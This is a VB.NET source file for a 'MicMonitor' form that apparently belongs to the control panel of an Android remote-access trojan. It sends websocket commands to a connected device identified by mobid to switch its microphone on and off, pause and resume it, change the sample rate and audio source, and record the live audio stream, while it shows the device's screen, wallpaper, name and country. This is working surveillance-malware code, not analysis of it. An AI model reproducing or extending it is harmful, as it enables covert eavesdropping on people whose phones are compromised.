Imports System.Threading
Imports DrakeUI.Framework
Imports Newtonsoft.Json.Linq

Public Class MicMonitor
    Public Btcli As BTClient
    Public isRecording As Boolean = False
    Public audioParts As New List(Of Byte())
    Public visualizer As AudioVisualizer
    Private websockclient As WebSocketClient = Nothing
    Private recotext As String = "Record"
    Private stoptext As String = "Stop"
    Private Sub MicMonitor_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.myico.Image = Btcli.wallpaper
        Me.myscr.Image = Btcli.screen
        visualizer = New AudioVisualizer(progressbaradio)
        translateme()
        statetimer.Start()
    End Sub
    Private Sub translateme()
        Select Case BTRegistry.GetValue(Regz.Language, "null")

            Case "AR"
                stoptext = "إيقاف"
                recotext = "تسجيل"
                recordbtn.Text = recotext
                pausebtn.Text = "توقف"
                continuebtn.Text = "متابعة"
                comboqultz.Text = "جودة الصوت"
                combosrces.Text = "مصدر الصوت"
                Exit Select
            Case "CN" ' Chinese
                stoptext = "停止"
                recotext = "录音"
                recordbtn.Text = recotext
                pausebtn.Text = "暂停"
                continuebtn.Text = "继续"
                comboqultz.Text = "音质"
                combosrces.Text = "音源"
                Exit Select

            Case "RU" ' Russian
                stoptext = "Остановить"
                recotext = "Запись"
                recordbtn.Text = recotext
                pausebtn.Text = "Пауза"
                continuebtn.Text = "Продолжить"
                comboqultz.Text = "Качество звука"
                combosrces.Text = "Источник звука"
                Exit Select

            Case "TR" ' Turkish
                stoptext = "Durdur"
                recotext = "Kaydet"
                recordbtn.Text = recotext
                pausebtn.Text = "Duraklat"
                continuebtn.Text = "Devam Et"
                comboqultz.Text = "Ses Kalitesi"
                combosrces.Text = "Ses Kaynağı"
                Exit Select
            Case "SP" ' Spanish
                stoptext = "Detener"
                recotext = "Grabar"
                recordbtn.Text = recotext
                pausebtn.Text = "Pausar"
                continuebtn.Text = "Continuar"
                comboqultz.Text = "Calidad de Sonido"
                combosrces.Text = "Fuente de Sonido"
                Exit Select

            Case "PR" ' Brazilian Portuguese
                stoptext = "Parar"
                recotext = "Gravar"
                recordbtn.Text = recotext
                pausebtn.Text = "Pausar"
                continuebtn.Text = "Continuar"
                comboqultz.Text = "Qualidade de Som"
                combosrces.Text = "Fonte de Som"
                Exit Select


            Case Else

        End Select
    End Sub
    Private Async Sub startbtn_Click(sender As Object, e As EventArgs) Handles startbtn.Click
        Dim qulty As String = ""
        Select Case comboqultz.Text
            Case "8000 (Hz)"
                qulty = "8000"
            Case "11025 (Hz)"
                qulty = "11025"
            Case "16000 (Hz)"
                qulty = "16000"
            Case "22050 (Hz)"
                qulty = "22050"
            Case "32000 (Hz)"
                qulty = "32000"
            Case "44100 (Hz)"
                qulty = "44100"
            Case Else
                qulty = "8000"
        End Select

        Dim datajoin As String = Await JoinServer(New With {
                               .case = "join",
                               .ping = "0",
                               .ismain = "0",
                               .chk = BTEngine.MainForm.Mainnextkey
                            }, BTEngine.MainForm.MainhttpClient)


        Dim socketidf As String = Btcli.SecoundIDF

        Dim result As JObject = JObject.Parse(datajoin)
        If result("Success") IsNot Nothing Then
            Dim datastr As String = result("Success").ToString.Trim("""")
            Log_d("Cli IDF websock", datastr)
            'Main_IDF = datastr

            websockclient = New WebSocketClient(livmicstr, Btcli.address)

            Dim connectionThread = New Thread(Sub() websockclient.Connect(datastr))
            connectionThread.IsBackground = True
            connectionThread.Start()

            Do
                Thread.Sleep(1)
            Loop While Not websockclient.IsConnected

            Log_d("IDF Ready to use", datastr)
            socketidf = datastr
        End If

        Dim chatData As New Dictionary(Of String, Object) From {
                             {"msg", "mic"},
                             {"subc", "ON"},
                             {"Arate", qulty},
                             {"skidf", socketidf},
                             {"Asrc", combosrces.SelectedIndex.ToString}
                        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
        startbtn.Enabled = False
        stopbtn.Enabled = True

    End Sub

    Private Sub stopbtn_Click(sender As Object, e As EventArgs) Handles stopbtn.Click
        Dim chatData As New Dictionary(Of String, Object) From {
                            {"msg", "mic"},
                            {"subc", "OFF"}
                       }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
        startbtn.Enabled = True
        stopbtn.Enabled = False
        visualizer.StopVisualization()
        If websockclient IsNot Nothing Then
            websockclient.Disconnect(livcamstr, Btcli.address)
            websockclient = Nothing
        End If

    End Sub



    Private Sub comboqultz_SelectedIndexChanged(sender As Object, e As EventArgs) Handles comboqultz.SelectedIndexChanged
        Dim qulty As String = ""
        Select Case comboqultz.Text
            Case "8000 (Hz)"
                qulty = "8000"
            Case "11025 (Hz)"
                qulty = "11025"
            Case "16000 (Hz)"
                qulty = "16000"
            Case "22050 (Hz)"
                qulty = "22050"
            Case "32000 (Hz)"
                qulty = "32000"
            Case "44100 (Hz)"
                qulty = "44100"
            Case Else
                Exit Sub
        End Select

        Dim chatData As New Dictionary(Of String, Object) From {
                            {"msg", "mic"},
                            {"subc", "cr"},
                            {"Arate", qulty}
                       }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

    End Sub

    Private Sub recordbtn_Click_1(sender As Object, e As EventArgs) Handles recordbtn.Click
        If recordbtn.TagString = "0" Then
            recordbtn.TagString = "1"
            recordbtn.ForeColor = Color.Lime
            progressbaradio.ForeColor = Color.Lime
            recordbtn.Symbol = 61713
            recordbtn.Text = stoptext
        Else
            recordbtn.TagString = "0"
            recordbtn.Symbol = 61744
            recordbtn.Text = recotext
            recordbtn.ForeColor = Color.White
            progressbaradio.ForeColor = Color.FromArgb(30, 136, 229)
        End If
    End Sub

    Private Sub DrakeUIButtonIcon10_Click(sender As Object, e As EventArgs) Handles pausebtn.Click
        Dim chatData As New Dictionary(Of String, Object) From {
                         {"msg", "mic"},
                         {"subc", "pz"}
                    }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
        visualizer.StopVisualization()
        pausebtn.Enabled = False
        continuebtn.Enabled = True
    End Sub

    Private Sub DrakeUIButtonIcon11_Click(sender As Object, e As EventArgs) Handles continuebtn.Click
        Dim chatData As New Dictionary(Of String, Object) From {
                       {"msg", "mic"},
                       {"subc", "co"}
                  }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
        pausebtn.Enabled = True
        continuebtn.Enabled = False
    End Sub

    Private Sub combosrces_SelectedIndexChanged(sender As Object, e As EventArgs) Handles combosrces.SelectedIndexChanged
        Dim chatData As New Dictionary(Of String, Object) From {
                           {"msg", "mic"},
                           {"subc", "cs"},
                           {"Arate", combosrces.SelectedIndex.ToString}
                      }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub statetimer_Tick(sender As Object, e As EventArgs) Handles statetimer.Tick
        Try
            If Btcli.isConnected Then
                Me.myscr.Image = Btcli.screen
                Me.myico.Image = Btcli.wallpaper
                Me.mytitle.Text = Microphonestr & " | " & Btcli.name & " | " & Btcli.country

            Else
                Me.myico.Image = My.Resources.no_con
                Me.myscr.Image = Nothing
                Me.mytitle.Text = Microphonestr & " | " & BTConst.Disconnectedstr

            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub MicMonitor_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If websockclient IsNot Nothing Then
            websockclient.Disconnect(livmicstr, Btcli.address)
            websockclient = Nothing
        End If

    End Sub
End Class